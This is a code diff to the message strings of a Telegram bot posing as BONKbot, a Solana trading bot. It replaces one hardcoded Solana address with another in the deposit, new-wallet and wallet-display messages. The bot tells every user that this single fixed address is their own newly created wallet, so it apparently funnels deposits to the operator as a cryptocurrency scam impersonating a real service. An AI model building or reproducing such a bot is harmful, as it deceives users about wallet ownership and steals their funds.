@@ -55,7 +55,7 @@ Solana’s fastest bot to trade any coin (SPL token), built by the BONK communit
 
 You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
 
-`<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>` (tap to copy)
+`<code>ACZ69C6xbFYfq6Uo3y9qNVnzecmyMxFogZyWtboFZJFW</code>` (tap to copy)
 
 Once done, tap refresh and your balance will appear here.
 
@@ -97,7 +97,7 @@ https://t.me/BONKbotChat"""
     
     DEPOSITADDRESS_TXT = """To start trading add funds to your sol wallet provided below ⬇️
 
-<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>"""
+<code>ACZ69C6xbFYfq6Uo3y9qNVnzecmyMxFogZyWtboFZJFW</code>"""
 
     BALANCEFETCH_TXT = """You Have No Balance To Withdraw."""
 
@@ -172,12 +172,12 @@ Increase your Transaction Priority to improve transaction speed. Select preset o
 SELL PROTECTION;
 100% sell commands require an additional confirmation step.  Tap to toggle."""
     NEWWALLET_TXT = """Your New Wallet has been Created Successfully 
-Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
+Address: <code>ACZ69C6xbFYfq6Uo3y9qNVnzecmyMxFogZyWtboFZJFW</code>
 Balance: 0.000000000 SOL"""
 
     WALLETADDRESS = """Your Wallet:
   
-Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
+Address: <code>ACZ69C6xbFYfq6Uo3y9qNVnzecmyMxFogZyWtboFZJFW</code>
 Balance: 0.000000000 SOL
   
 Tap to copy the address and send SOL to deposit."""
